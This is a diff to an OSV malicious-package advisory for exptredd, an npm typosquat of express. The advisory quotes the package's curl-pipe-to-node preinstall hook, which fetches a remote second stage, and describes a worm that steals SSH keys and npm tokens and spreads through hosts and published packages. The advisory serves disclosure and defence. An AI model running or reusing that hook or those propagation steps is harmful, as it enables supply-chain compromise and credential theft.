@@ -2,7 +2,7 @@
   "schema_version": "1.7.4",
   "id": "MAL-2026-17247",
   "published": "2026-09-29T07:12:49Z",
-  "modified": "2026-10-04T23:18:29.308765769Z",
+  "modified": "2026-10-05T22:46:44.625336583Z",
   "summary": "Malicious code in exptredd (npm)",
   "details": "The package exptredd impersonates the legitimate 'express' package (it republishes express's package metadata and code) and adds a malicious preinstall hook that runs automatically on npm install, before any dependency is installed: `curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js | node`. The hook downloads a remote JavaScript second stage from a Wayback Machine mirror of a Codeberg repository (hellscripter/install-scripts) and pipes it directly into node, giving the attacker arbitrary code execution on the installing machine. Version 5.2.1 was published on 2026-09-29. It is one of nine packages published within about 33 minutes by the npm account 'dirtyblanket' (maintainer email s7dwzxru4z@ooynib.com), all carrying the identical preinstall hook: xeprews, express-javascript, express-nodejs, react-nodejs, exprdd, exprrdd, exptrdd, exptred, exptredd.\n\nOn Linux, node.js pipes linux.sh from the same Codeberg repository into bash. linux.sh (SHA-256 65f0a95b24e30305146346cbc2452cfabadab9e1ca35053e1134b67c38919577) is a worm. It installs a Go binary, systemd-fontd, as a systemd service named \"Font Rendering Service\" that proxies through Tor. SafeDep has not yet analyzed that binary. The script collects SSH private keys and known_hosts files, then connects to the known hosts over SSH and runs linux.sh on them. With the same keys, it pushes a linux.sh loader into the .install file of Arch User Repository (AUR) packages that the key owner maintains. For each package.json on disk, it adds the same preinstall script, runs npm version patch, and runs npm publish with each .npmrc it finds.\n\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (906cb705c9e58527d888fca6e046fafb5586b0529f989496d96a92a5450f0e7c)\nexptredd@5.2.3 is published under a name resembling express and ships express's package metadata (description, author, contributors, repository, homepage, keywords, dependency list) verbatim as a cover for a malicious install-time payload. package.json line 98 defines a preinstall lifecycle script that uses curl to fetch an unpinned remote JavaScript file from an anonymous gitflic.ru project (hellscripter/install-scripts) proxied via web.archive.org and pipes the response directly into node, executing attacker-controlled code on the installer's host during npm install. The fetch destination is unrelated to express's publisher, is not pinned by hash or version, and is served over a mutable archive URL whose content the attacker controls. The combination of name-confusion with express, verbatim express metadata as disguise, and an install-time curl|node dropper to a non-publisher host is a confirmed install-time remote code execution against any developer or build system that runs npm install on this package.\n",
   "affected": [
@@ -18,6 +18,11 @@
       ],
       "database_specific": {
         "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
           {
             "cweId": "CWE-506",
             "description": "The product contains code that appears to be malicious in nature.",
@@ -154,6 +159,14 @@
       "name": "Amazon Inspector",
       "contact": [
         "inspector-research@amazon.com"
+      ],
+      "type": "FINDER"
+    },
+    {
+      "name": "InvisiRisk, Inc.",
+      "contact": [
+        "https://www.invisirisk.com",
+        "mailto:research@invisirisk.com"
       ],
       "type": "FINDER"
     },
